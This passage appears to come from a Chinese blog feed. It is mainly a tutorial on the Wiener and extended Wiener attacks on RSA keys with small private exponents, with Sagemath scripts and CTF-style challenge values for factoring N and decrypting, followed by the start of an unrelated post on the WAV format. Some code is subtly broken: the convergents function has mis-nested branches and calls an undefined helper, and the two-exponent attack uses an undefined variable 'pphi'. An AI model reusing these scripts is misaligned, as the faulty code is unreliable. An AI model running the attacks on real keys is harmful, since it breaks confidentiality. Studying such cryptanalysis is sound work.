\frac{73}{95}=0+\frac{1}{1+\frac{1}{3+\frac{1}{3+\frac{1}{7+}}}}=[0,1,3,3,7]\\
\pi=[3,7,15,1,292,1,1,1,2,\cdots]
\]</span> 获取连分数的 Python 脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">continuedFractions</span>(<span class="params">x: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用辗转相处将分数 x/y 转为连分数的形式</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; list(continuedFractions(73, 95))</span></span><br><span class="line"><span class="string">    [0, 1, 3, 3, 7]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    `Parameters`:</span></span><br><span class="line"><span class="string">        x - 分子\\</span></span><br><span class="line"><span class="string">        y - 分母</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    `Returns`:</span></span><br><span class="line"><span class="string">        连分数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        <span class="keyword">yield</span> x // y</span><br><span class="line">        x, y = y, x % y</span><br></pre></td></tr></table></figure>
<p>或者我们也可以使用 Sagemath 的函数获取连分数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = continued_fraction(<span class="number">73</span>/<span class="number">95</span>)</span><br><span class="line"><span class="built_in">print</span>(a.quotient(<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(a.quotients())</span><br></pre></td></tr></table></figure>
<h3 id="有理近似收敛分数">有理近似（收敛分数）</h3>
<p>虽然 <span class="math inline">\(\pi\)</span>
是一个无理数，但我们可以使用连分数展开式获取到一个简洁的有理近似： <span class="math display">\[
c_0=\frac{3}{1}=3.0\\
c_1=3+\frac{1}{7}=3.142857\\
c_2=3+\frac{1}{7+\frac{1}{15}}=3.141509\\
\cdots
\]</span> 这些有理数 (<span class="math inline">\(c_i\)</span>)
我们称作连分数的收敛，当 <span class="math inline">\(i\)</span>
增大时，<span class="math inline">\(c_i\)</span> 将会无限接近于 <span class="math inline">\(\pi\)</span></p>
<p>我们把这样的 <span class="math inline">\(c_i\)</span>
所组成的数列称作对某个数 <span class="math inline">\(e\)</span>
的一个收敛分数，表示形式为： <span class="math display">\[
e=[c_0,c_1,\cdots,c_n]
\]</span>
而同时需要知道<strong>任何一个有理数与其连分数形式是一一对应的</strong>。</p>
<p>故实际上对于任何一个有理数我们都可以将其展开成一个对应的收敛分数形式。</p>
<p>获取收敛分数的 Python 脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">convergents</span>(<span class="params">x: <span class="built_in">int</span>, y: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        使用辗转相处将分数 x/y 转为渐进分数的形式</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; list(ContinuedFraction.convergents(73, 95))</span></span><br><span class="line"><span class="string">        [(0, 1), (1, 1), (3, 4), (10, 13), (73, 95)]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        `Parameters`:</span></span><br><span class="line"><span class="string">            x - 分子\\</span></span><br><span class="line"><span class="string">            y - 分母</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        `Returns`:</span></span><br><span class="line"><span class="string">            连分数</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">    numerators, denominators = [], []</span><br><span class="line">    <span class="keyword">for</span> idx, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(ContinuedFraction.fractions(x, y)):</span><br><span class="line">        <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">            ni, di = val, <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> idx == <span class="number">1</span>:</span><br><span class="line">                ni, di = val * numerators[-<span class="number">1</span>] + <span class="number">1</span>, val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    ni, di = val * numerators[-<span class="number">1</span>] + numerators[-<span class="number">2</span>], val * denominators[-<span class="number">1</span>] + denominators[-<span class="number">2</span>]</span><br><span class="line">                    numerators.append(ni)</span><br><span class="line">                    denominators.append(di)</span><br><span class="line">                    <span class="keyword">yield</span> ni, di</span><br></pre></td></tr></table></figure>
<p>或者我们也可以使用 Sagemath 的函数获取渐进分数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = continued_fraction(<span class="number">73</span>/<span class="number">95</span>)</span><br><span class="line"><span class="built_in">print</span>(a.convergent(<span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(a.convergents())</span><br></pre></td></tr></table></figure>
<h3 id="legendres-theorem-连分数定理">Legendre's theorem
(连分数定理)</h3>
<p>如果存在 <span class="math inline">\(\alpha \in \Q\)</span>，<span class="math inline">\(c,d\in \Z\)</span> 满足 <span class="math display">\[
\left|\alpha-\frac{c}{d}\right|&lt;\frac{1}{2d^2}
\]</span> 那么 <span class="math inline">\(\displaystyle\frac{c}{d}\)</span> 就是 <span class="math inline">\(a\)</span> 的一个有理近似。</p>
<h3 id="原理">原理</h3>
<p>首先我们考虑，如果已知 <span class="math inline">\(N=pq\)</span> 和
<span class="math inline">\(\varphi(N)=(p-1)(q-1)\)</span>，那么 <span class="math display">\[
\begin{align}
\varphi(N)&amp;=(p-1)(q-1)\\
&amp;=N-p-q+1\\
&amp;=N-p-\frac{N}{p}+1
\end{align}
\]</span> 因此我们可以得到方程： <span class="math display">\[
p^2+p(\varphi(N)-N-1)+N=0
\]</span> 所以当已知 <span class="math inline">\(N\)</span> 和 <span class="math inline">\(\varphi(N)\)</span> 时，<span class="math inline">\(N\)</span> 是极易分解的。</p>
<p>其次我们知道 <span class="math inline">\(ed=1\pmod{\varphi(N)}\)</span>，即存在一个 <span class="math inline">\(k\)</span> 使得： <span class="math display">\[
ed=1+k\varphi(N)
\]</span> 对其变形可得 <span class="math display">\[
\left|\frac{e}{\varphi(N)}-\frac{k}{d}\right|=\frac{1}{d\varphi(N)}
\]</span> 由 <strong>Legendre's theorem</strong> 可得，<span class="math inline">\(\displaystyle\frac{k}{d}\)</span> 是 <span class="math inline">\(\displaystyle\frac{e}{\varphi(N)}\)</span>
的一个有理近似，如果我们获得了 <span class="math inline">\(\displaystyle\frac{e}{\varphi(N)}\)</span>，那么我们就可以从其的有理近似中获取
<span class="math inline">\(\displaystyle\frac{k}{d}\)</span>。（<span class="math inline">\(d\)</span> 泄露攻击）</p>
<p>但在维纳攻击中，我们只有 <span class="math inline">\(e\)</span> 和
<span class="math inline">\(N\)</span>，那是否会在特定条件中 <span class="math inline">\(\displaystyle\frac{k}{d}\)</span> 是 <span class="math inline">\(\displaystyle\frac{e}{N}\)</span>
的一个有理近似？</p>
<p>实际上当 <span class="math inline">\(N=pq\)</span> 且 <span class="math inline">\(q&lt;p&lt;2q\)</span> 时，如果满足 <span class="math inline">\(d&lt;\displaystyle\frac{1}{3}N^{\frac{1}{4}}\)</span>，那么
<span class="math inline">\(\displaystyle\frac{k}{d}\)</span> 将是 <span class="math inline">\(\displaystyle\frac{e}{N}\)</span>
的一个有理近似。</p>
<h3 id="步骤">步骤</h3>
<ol type="1">
<li>估测是否满足 <span class="math inline">\(d&lt;\displaystyle\frac{1}{3}N^{\frac{1}{4}}\)</span></li>
<li>求 <span class="math inline">\(\displaystyle\frac{e}{N}\)</span>
的连分数展开</li>
<li>迭代连分数 <span class="math inline">\(\displaystyle\frac{k_i}{d_i}\)</span>：
<ul>
<li>使用 <span class="math inline">\(k_i\)</span> 和 <span class="math inline">\(d_i\)</span> 计算出 <span class="math inline">\(\varphi_i(N)\)</span></li>
<li>使用 <span class="math inline">\(\varphi_i(N)\)</span> 计算出 <span class="math inline">\(N\)</span>，然后通过因式分解进行验证是否正确（我们也可以直接进行解密验证）</li>
</ul></li>
</ol>
<h3 id="脚本">脚本</h3>
<p>以下仅给出 Sagemath 脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">N, e</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    维纳攻击</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    `Parameters`:</span></span><br><span class="line"><span class="string">        N - p * q\\</span></span><br><span class="line"><span class="string">        e - public key</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    `Returns`:</span></span><br><span class="line"><span class="string">        p, q, d</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = continued_fraction(e / N)</span><br><span class="line">    convers = cf.convergents()</span><br><span class="line">    <span class="keyword">for</span> pkd <span class="keyword">in</span> convers:</span><br><span class="line">        <span class="comment"># possible k, d</span></span><br><span class="line">        pk, pd = pkd.as_integer_ratio()</span><br><span class="line">        <span class="keyword">if</span> pk == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># verify</span></span><br><span class="line">        <span class="keyword">if</span> (e * pd - <span class="number">1</span>) % pk != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># possible phi</span></span><br><span class="line">        pphi = (e * pd - <span class="number">1</span>) // pk</span><br><span class="line">        p = var(<span class="string">&#x27;p&#x27;</span>, domain=ZZ)</span><br><span class="line">        roots = solve(p ** <span class="number">2</span> + (pphi - N - <span class="number">1</span>) * p + N, p)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(roots) == <span class="number">2</span>:</span><br><span class="line">            <span class="comment"># possible p, q</span></span><br><span class="line">            pp, pq = roots</span><br><span class="line">            <span class="keyword">if</span> pp * pq == N:</span><br><span class="line">                <span class="keyword">return</span> pp, pq, pd</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Could not factor N!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">507419170088344932990702256911694788408493968749527614421614568612944144764889717229444020813658893362983714454159980719026366361318789415279417172858536381938870379267670180128174798344744371725609827872339512302232610590888649555446972990419313445687852636305518801236132032618350847705234643521557851434711389664130274468354405273873218264222293858509477860634889001898462547712800153111774564939279190835857445378261920532206352364005840238252284065587291779196975457288580812526597185332036342330147250312262816994625317482869849388424397437470502449815132000588425028055964432298176942124697105509057090546600330760364385753313923003549670107599757996810939165300581847068233156887269181096893089415302163770884312255957584660964506028002922164767453287973102961910781312351686488047510932997937700597992705557881172640175117476017503918294534205898046483981707558521558992058512940087192655700351675718815723840568640509355338482631416345193176708501897458649841539192993142790402734898948352382350766125000186026261167277014748183012844440603384989647664190074853086693408529737767147592432979469020671772152652865219092597717869942730499507426269170189547020660681363276871874469322437194397171763927907099922324375991793759</span></span><br><span class="line">e = <span class="number">77310199867448677782081572109343472783781135641712597643597122591443011229091533516758925238949755491395489408922437493670252550920826641442189683907973926843505436730014899918587477913032286153545247063493885982941194996251799882984145155733050069564485120660716110828110738784644223519725613280140006783618393995138076030616463398284819550627612102010214315235269945251741407899692274978642663650687157736417831290404871181902463904311095448368498432147292938825418930527188720696497596867575843476810225152659244529481480993843168383016583068747733118703000287423374094051895724494193455175131120243097065270804457787026492578916584536863548445813916819417857064037664101684455000184987531252344582899589746272173970083733130106407810619258077266603898529285634495710846838011858287024329514491058790557305041389614650730267774482954666726949886313386881066593946789460028399523245777171320319444673551268379126203862576627540177888290265714418064334752499940587750374552330008143708562065940245637685833371348603338834447212248648869514585047871442060412622164276894766238383894693759347590977926306581080390685360615407766600573527565016914830132066428454738135380178959590692145577418811677639050929791996313180297924833690095</span></span><br><span class="line">c = <span class="number">165251729917394529793163344300848992394021337429474789711805041655116845722480301677817165053253655027459227404782607373107477419083333844871948673626672704233977397989843349633720167495862807995411682262559392496273163155214888276398332204954185252030616473235814999366132031184631541209554169938146205402400412307638567132128690379079483633171535375278689326189057930259534983374296873110199636558962144635514392282351103900375366360933088605794654279480277782805401749872568584335215630740265944133347038070337891035560658434763924576508969938866566235926587685108811154229747423410476421860059769485356567301897413767088823807510568561254627099309752215808220067495561412081320541540679503218232020279947159175547517811501280846596226165148013762293861131544331444165070186672186027410082671602892508739473724143698396105392623164025712124329254933353509384748403154342322725203183050328143736631333990445537119855865348221215277608372952942702104088940952142851523651639574409075484106857403651453121036577767672430612728022444370874223001778580387635197325043524719396707713385963432915855227152371800527536048555551237729690663544828830627192867570345853910196397851763591543484023134551876591248557980182981967782409054277224</span></span><br><span class="line">p, q, d = wienerAttack(N, e)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, N)</span><br></pre></td></tr></table></figure>
<h2 id="扩展维纳攻击">扩展维纳攻击</h2>
<h3 id="wiener-s-approach">Wiener 's Approach</h3>
<p>我们已知 <span class="math display">\[
ed=k\varphi(N)+1
\]</span> 不妨令 <span class="math inline">\(s=1-p-q\)</span>，那么
<span class="math display">\[
ed-kN=ks+1\tag{W}
\]</span></p>
<h3 id="guo-s-approach-with-two-exponents">Guo 's Approach With Two
Exponents</h3>
<p>如果对于同一个 <span class="math inline">\(N\)</span> 存在 <span class="math inline">\((e_1,e_2)\)</span> 都有相对应较小的 <span class="math inline">\((d_1,d_2)\)</span>，那么我们可以得到： <span class="math display">\[
\begin{cases}
e_1d_1-k_1\varphi(N)=1\\
e_2d_2-k_2\varphi(N)=1\\
\end{cases}
\]</span> 对其进行化简得到： <span class="math display">\[
e_1d_1k_2-e_2d_2k_1=k_2-k_1\tag{G(1,2)}
\]</span> 可以推导出 <span class="math display">\[
\left|\frac{e_1}{e_2}-\frac{d_2k_1}{d_1k_2}\right|=\frac{|k_2-k_1|}{e_2d_1k_1}
\]</span> 那么如果 <span class="math inline">\(2(k_2-k_1)d_1k_2&lt;e_2\)</span>，根据
<strong>Legendre's theorem</strong> 我们得知 <span class="math inline">\(\displaystyle\frac{d_2k_1}{d_1k_2}\)</span> 是
<span class="math inline">\(\displaystyle\frac{e_1}{e_2}\)</span>
的一个有理近似。</p>
<p>但通过 <span class="math inline">\(\displaystyle\frac{d_2k_1}{d_1k_2}\)</span> 确定
<span class="math inline">\((d_1,d_2)\)</span> 不是很现实。</p>
<h3 id="两个小解密指数的原理">两个小解密指数的原理</h3>
<p>结合维纳攻击和 <strong>Guo's
Approach</strong>，我们可以通过多个等式构造格后，利用 LLL
格规约算法化简求解该问题。</p>
<p>首先假设 <span class="math inline">\(d_i&lt;N^\alpha\)</span>，联立四个式子：</p>
<ol type="1">
<li><p><span class="math display">\[
k_1k_2=k_1k_2
\]</span></p></li>
<li><p><span class="math inline">\(W_1\cdot k_2\)</span> <span class="math display">\[
e_1d_1k_2-k_1Nk_2=k_2(k_1s+1)
\]</span></p></li>
<li><p><span class="math inline">\(G(1,2)\)</span> <span class="math display">\[
e_2d_2k_1-e_1d_1k_2=k_1-k_2\tag{G(1,2)}
\]</span></p></li>
<li><p><span class="math inline">\(W_1\cdot W_2\)</span> <span class="math display">\[
(e_1d_1-k_1N)(e_2d_2-k_2N)=(k_2s+1)(k_2s+1)\\
\Downarrow\\
d_1d_2e_1e_2-d_1k_2e_1N-d_2k_1e_2N+k_1k_2N^2=(k_2s+1)(k_2s+1)
\]</span></p></li>
</ol>
<p>从而构造矩阵 <span class="math inline">\(A,L,B\)</span> <span class="math display">\[
A=
\begin{pmatrix}
  k_1k_2,d_1k_2,d_2k_1,d_1d_2
\end{pmatrix}\\
L=
\begin{pmatrix}
  1 &amp; -N &amp; 0 &amp; N^2 \\
  0 &amp; e_1 &amp; -e_1 &amp; -e_1N \\
  0 &amp; 0 &amp; e_2 &amp; -e_2N \\
  0 &amp; 0 &amp; 0 &amp; e_1e_2
\end{pmatrix}\\
B=\begin{pmatrix}k_1k_2,k_2(k_1s+1),k_1-k_2,(k_2s+1)(k_2s+1)\end{pmatrix}
\]</span> 满足 <span class="math display">\[
A\cdot L=B
\]</span> 而根据假设可知 <span class="math display">\[
e_i\approx N\\
d_i\approx N^\alpha\\
k_i\approx d_i \approx N^\alpha\\
g\approx 1\\
s=1-p-q\approx N^{0.5}
\]</span> 根据 <strong>Minkowoski′s first theorem</strong>
可知，只有满足 <span class="math display">\[
\lambda_1(L)\leq\sqrt{n}\det(L)^{\frac{1}{n}}
\]</span> 才能算是最短向量，但明显右边计算结果为 <span class="math inline">\(N\)</span>，明显 <span class="math inline">\(||B||&gt;N\)</span>，所以需要考虑使得等式两边的大小尽量接近，而等式右边向量的大小为
<span class="math inline">\((N^{2\alpha},N^{0.5+2\alpha},N^{\alpha},N^{1+2\alpha})\)</span>，故我们最终构造的矩阵应该为：
<span class="math display">\[
L=
\begin{pmatrix}
  1 &amp; -N &amp; 0 &amp; N^2 \\
  0 &amp; e_1 &amp; -e_1 &amp; -e_1N \\
  0 &amp; 0 &amp; e_2 &amp; -e_2N \\
  0 &amp; 0 &amp; 0 &amp; e_1e_2
\end{pmatrix}
\cdot
\begin{pmatrix}
  N &amp;  &amp;  &amp;  \\
   &amp; N^0.5 &amp;  &amp;  \\
   &amp;  &amp; N^{1+\alpha} &amp;  \\
   &amp;  &amp;  &amp; 1
\end{pmatrix}
\]</span> 这样便使得向量 <span class="math inline">\(B\)</span> 满足
<span class="math display">\[
||BL||&lt;2N^{1+2\alpha}
\]</span> 将问题转化为类 SVP 问题后，使用格规约算法 LLL 既可以得到基向量
<span class="math inline">\(B\)</span>，随后 <span class="math display">\[
\frac{B_2}{B_1}=\frac{d_1}{k_1}\\
\varphi(N)=\frac{ed}{k}
\]</span> 在这里根据部分证明可知，对于两个小解密指数的情况，当 <span class="math inline">\(c\)</span> 较小时，如果有 <span class="math display">\[
\alpha&lt;\frac{5}{14}-\varepsilon
\]</span> 就可以通过格基规约找到向量 <span class="math inline">\(B\)</span>。</p>
<h3 id="三个小解密指数的情况">三个小解密指数的情况</h3>
<p>对于三个指数的情况我们额外选取 <span class="math inline">\(G(1,3),W_1G(2,3),W_2G(1,3)\)</span>
的等式，这样我们的向量 <span class="math inline">\(B\)</span> 为： <span class="math display">\[
B = \begin{pmatrix}
k_1k_2k_3&amp;d_1gk_2k_3&amp;k_1d_2gk_3&amp;d_1d_2g^2k_3&amp;k_1k_2d_3g&amp;k_1d_3g&amp;k_2d_3g&amp;d_1d_2d_3g^3
\end{pmatrix}
\]</span> 然后我们便可以构造格： <span class="math display">\[
L = \begin{pmatrix}
        1 &amp; -N &amp; 0 &amp; N^{2} &amp; 0 &amp; 0 &amp; 0 &amp;
-N^{3} \\
        0 &amp; e_{1} &amp; -e_{1} &amp; -N e_{1} &amp; -e_{1} &amp; 0
&amp; N e_{1} &amp; N^{2} e_{1} \\
        0 &amp; 0 &amp; e_{2} &amp; -N e_{2} &amp; 0 &amp; N e_{2} &amp;
0 &amp; N^{2} e_{2} \\
        0 &amp; 0 &amp; 0 &amp; e_{1} e_{2} &amp; 0 &amp; -e_{1} e_{2}
&amp; -e_{1} e_{2} &amp; -N e_{1} e_{2} \\
        0 &amp; 0 &amp; 0 &amp; 0 &amp; e_{3} &amp; -N e_{3} &amp; -N
e_{3} &amp; N^{2} e_{3} \\
        0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; e_{1} e_{3} &amp; 0
&amp; -N e_{1} e_{3} \\
        0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; e_{2} e_{3}
&amp; -N e_{2} e_{3} \\
        0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; e_{1}
e_{2} e_{3}
        \end{pmatrix}
\]</span> 其中 <span class="math display">\[
D = diag\begin{pmatrix}
    N^{\frac{3}{2}}&amp;N&amp;N^{a + \frac{3}{2}}&amp;\sqrt{N}&amp;N^{a
+ \frac{3}{2}}&amp;N^{a + 1}&amp;N^{a + 1}&amp;1\end{pmatrix}
\]</span> 同样我们可以得知 <span class="math display">\[
||BL||&lt;\sqrt{8}N^{1.5+2\alpha}
\]</span> 证明可得，当 <span class="math display">\[
\alpha&lt;\frac{2}{5}-\varepsilon
\]</span> 时，可以通过格基规约求出向量 <span class="math inline">\(B\)</span>。</p>
<h3 id="选择关系">选择关系</h3>
<p>论文末位给出的 <span class="math inline">\(n\leq 5\)</span>
的选择关系表：</p>
<figure>
<img src="/wiener-attack/extendwiener-chosen-relations.png" alt="选择关系表">
<figcaption aria-hidden="true">选择关系表</figcaption>
</figure>
<h3 id="脚本-1">脚本</h3>
<p>这里仅给出 Sagemath 的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack2</span>(<span class="params">N, e1, e2</span>):</span><br><span class="line">    a = <span class="number">5</span>/<span class="number">14</span></span><br><span class="line">    D = diagonal_matrix(ZZ, [N, <span class="built_in">int</span>(N^(<span class="number">1</span>/<span class="number">2</span>)), <span class="built_in">int</span>(N^(<span class="number">1</span>+a)), <span class="number">1</span>])</span><br><span class="line">    M = matrix(ZZ, [[<span class="number">1</span>, -N, <span class="number">0</span>, N^<span class="number">2</span>], [<span class="number">0</span>, e1, -e1, -e1*N], [<span class="number">0</span>, <span class="number">0</span>, e2, -e2*N], [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, e1*e2]])*D</span><br><span class="line">    L = M.LLL()</span><br><span class="line">    B = vector(ZZ, L[<span class="number">0</span>])</span><br><span class="line">    A = B * M^(-<span class="number">1</span>)</span><br><span class="line">    phi = <span class="built_in">int</span>(A[<span class="number">1</span>]/A[<span class="number">0</span>]*e1)</span><br><span class="line">    d1 = inverse_mod(e1, phi)</span><br><span class="line">    d2 = inverse_mod(e2, phi)</span><br><span class="line">    p = var(<span class="string">&#x27;p&#x27;</span>, domain=ZZ)</span><br><span class="line">    roots = solve(p ** <span class="number">2</span> + (pphi - N - <span class="number">1</span>) * p + N, p)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(roots) == <span class="number">2</span>:</span><br><span class="line">        <span class="comment"># possible p, q</span></span><br><span class="line">        p, q = roots</span><br><span class="line">        <span class="keyword">if</span> p * q == N:</span><br><span class="line">            <span class="keyword">return</span> p, q, d1, d2</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Could not factor N!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">114552459553730357961013268333698879659007919035942930313432809776799669181481660306531243618160127922304264986001501784564575128319884991774542682853466808329973362019677284072646678280051091964555611220961719302320547405880386113519147076299481594997799884384012548506240748042365643212774215730304047871679706035596550898944580314923260982768858133395187777029914150064371998328788068888440803565964567662563652062845388379897799506439389461619422933318625765603423604615137217375612091221578339493263160670355032898186792479034771118678394464854413824347305505135625135428816394053078365603937337271798774138959</span></span><br><span class="line">e2 = <span class="number">27188825731727584656624712988703151030126350536157477591935558508817722580343689565924329442151239649607993377452763119541243174650065563589438911911135278704499670302489754540301886312489410648471922645773506837251600244109619850141762795901696503387880058658061490595034281884089265487336373011424883404499124002441860870291233875045675212355287622948427109362925199018383535259913549859747158348931847041907910313465531703810313472674435425886505383646969400166213185676876969805238803587967334447878968225219769481841748776108219650785975942208190380614555719233460250841332020054797811415069533137170950762289</span></span><br><span class="line">N = <span class="number">14922959775784066499316528935316325825140011208871830627653191549546959775167708525042423039865322548420928571524120743831693550123563493981797950912895893476200447083386549353336086899064921878582074346791320104106139965010480614879592357793053342577850761108944086318475849882440272688246818022209356852924215237481460229377544297224983887026669222885987323082324044645883070916243439521809702674295469253723616677245762242494478587807402688474176102093482019417118703747411862420536240611089529331148684440513934609412884941091651594861530606086982174862461739604705354416587503836130151492937714365614194583664241</span></span><br><span class="line">p, q, d1, d2 = wienerAttack2(N, e1, e2)</span><br></pre></td></tr></table></figure>
<h2 id="参考论文">参考论文</h2>
<p>《A New Attack on RSA with Two or Three》</p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>crypto</tag>
        <tag>rsa</tag>
      </tags>
  </entry>
  <entry>
    <title>wav数据格式详解</title>
    <url>//wav-note.html</url>
    <content><![CDATA[<h1 id="简述">简述</h1>
<p>WAV 文件是在 PC 机平台上很常见的、最经典的多媒体音频文件， 是
WaveForm
的简写，也称为波形文件，可直接存储声音波形，还原的波形曲线十分逼真。</p>
<p>WAV 的特点如下：真实记录自然声波形，基本无数据压缩，数据量大。</p>
<h1 id="文件结构">文件结构</h1>
<p>WAV 文件遵循 RIFF
规则，其内容以区块（chunk）为最小单位进行存储。WAV文件一般由3个区块组成：RIFF
chunk、Format chunk 和 Data chunk。</p>
<h2 id="chunk">CHUNK</h2>
<p>每个 CHUNK 的格式都是：</p>
<table>
<thead>
<tr class="header">
<th><strong>名称</strong></th>
<th><strong>字节数</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>ID</td>
<td>4</td>
<td>标识</td>
</tr>
<tr class="even">
<td>Size</td>
<td>4</td>
<td>该块的数据长度</td>
</tr>
<tr class="odd">
<td>Data</td>
<td>Size</td>
<td>该块的数据</td>
</tr>
</tbody>
</table>
<p>以下是存在的 CHUNK 类型：</p>
<table>
<thead>
<tr class="header">
<th><strong>数据块符号</strong></th>
<th><strong>数据块名称</strong></th>
<th><strong>可选否</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>RIFF chunk</code></td>
<td>文件头数据块</td>
<td>否</td>
</tr>
<tr class="even">
<td><code>Format chunk</code></td>
<td>格式数据块</td>
<td>否</td>
</tr>
<tr class="odd">
<td><code>Data chunk</code></td>
<td>波形数据块</td>
<td>否</td>
</tr>
<tr class="even">
<td><code>Fact chunk</code></td>
<td></td>
<td>是</td>
</tr>
<tr class="odd">
<td><code>Cue points chunk</code></td>
<td></td>
<td>是</td>
</tr>
<tr class="even">
<td><code>Playlist chunk</code></td>
<td></td>
<td>是</td>
</tr>
<tr class="odd">
<td><code>Associated data list chunk</code></td>
<td></td>
<td>是</td>
</tr>
</tbody>
</table>
<h3 id="riff-chunk">RIFF chunk</h3>
<table>
<thead>
<tr class="header">
<th><strong>名称</strong></th>
<th><strong>字节数</strong></th>
<th><strong>端序</strong></th>
<th><strong>内容</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>ID</td>
<td>4</td>
<td>大端</td>
<td>RIFF (0x52494646)</td>
</tr>
<tr class="even">
<td>Size</td>
<td>4</td>
<td>小端</td>
<td>fileSize - 8 (文件大小 - 8)</td>
</tr>
<tr class="odd">
<td>Type</td>
<td>4</td>
<td>大端</td>
<td>WAVE (0x57415645)</td>
</tr>
</tbody>
</table>
<p>当 Type 是 <code>WAVE</code>
时，表示后面需要两个子块：<code>Format chunk</code> 和
<code>Data chunk</code>。</p>
<h3 id="format-chunk">Format chunk</h3>
<table>
<thead>
<tr class="header">
<th><strong>名称</strong></th>
<th><strong>字节数</strong></th>
<th><strong>端序</strong></th>
<th><strong>内容</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>ID</td>
<td>4</td>
<td>大端</td>
<td>fmt (0x666D7420)</td>
</tr>
<tr class="even">
<td>Size</td>
<td>4</td>
<td>小端</td>
<td>16</td>
</tr>
<tr class="odd">
<td>AudioFormat</td>
<td>2</td>
<td>小端</td>
<td>音频格式</td>
</tr>
<tr class="even">
<td>NumChannels</td>
<td>2</td>
<td>小端</td>
<td>声道数 (1 or 2)</td>
</tr>
<tr class="odd">
<td>SampleRate</td>
<td>4</td>
<td>小端</td>
<td>采样率</td>
</tr>
<tr class="even">
<td>ByteRate</td>
<td>4</td>
<td>小端</td>
<td>每秒数据字节数</td>
</tr>
<tr class="odd">
<td>BlockAlign</td>
<td>2</td>
<td>小端</td>
<td>数据块对齐</td>
</tr>
<tr class="even">
<td>BitsPerSample</td>
<td>2</td>
<td>小端</td>
<td>采样位数 (8, 16 or 32)</td>
</tr>
</tbody>
</table>
<blockquote>
<p>需要注意的是，ByteRate 和 BlockAlign
是可以计算出来的，如果不满足公式可能导致读取文件错误：</p>
<p>ByteRate = SampleRate * NumChannels * BitsPerSample / 8</p>
<p>BlockAlign = NumChannels * BitsPerSample / 8</p>
</blockquote>
<p>BitsPerSample 代表的是采样位数，即接下来的 Data chunk
中的每个波形数据有几个字节。</p>
<h3 id="data-chunk">Data chunk</h3>
<table>
<thead>
<tr class="header">
<th><strong>名称</strong></th>
<th><strong>字节数</strong></th>
<th><strong>端序</strong></th>
<th><strong>内容</strong></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>ID</td>
<td>4</td>
<td>大端</td>
<td>data (0x64617461)</td>
</tr>
<tr class="even">
<td>Size</td>
<td>4</td>
<td>小端</td>
<td>N</td>
</tr>
<tr class="odd">
<td>Data</td>
<td>Size</td>
<td>小端</td>
<td>波形数据</td>
</tr>
</tbody>
</table>
<blockquote>
<p>需要注意的是，Size = ByteRate * seconds</p>
</blockquote>
<p>如果声道数为 2，即多声道音频，在 Data 中每次采样依次排列，即例如 8bit
双声道的数据存放为：</p>
<table>
<colgroup>
<col style="width: 25%">
<col style="width: 25%">
<col style="width: 25%">
<col style="width: 25%">
</colgroup>
<thead>
<tr class="header">
<th>采样1</th>
<th></th>
<th>采样2</th>
<th></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>声道1数据 (1 byte)</td>
<td>声道2数据 (1 byte)</td>
<td>声道1数据 (1 byte)</td>
<td>声道2数据 (1 byte)</td>
</tr>
</tbody>
</table>
<h1 id="音频处理">音频处理</h1>
<h2 id="python3wave">python3&amp;wave</h2>
